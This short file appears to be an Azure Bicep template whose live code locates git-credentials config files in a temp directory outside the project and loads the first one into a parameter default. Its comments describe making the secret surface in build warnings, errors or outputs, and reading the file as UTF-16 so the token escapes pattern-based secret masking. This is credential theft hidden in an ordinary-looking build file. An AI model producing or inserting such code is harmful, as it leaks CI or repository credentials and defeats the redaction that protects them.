
// Read UTF-8 file as UTF-16 - bytes will be misinterpreted, producing
// garbled output that might not match the token pattern
// var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')
// var leak int = garbled  // Leaks to stderr immediately
// output x string = 'x'
// output garbledContent int = garbled

// // Also try reading as UTF-16BE (big endian)
// output garbledBE string = garbled2

// var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')
// output token string = garbled    // Garbled token in output
// This will generate a warning you can see at build time



var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')

var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')

#disable-next-line no-unused-params
param debugMessage string = garbled
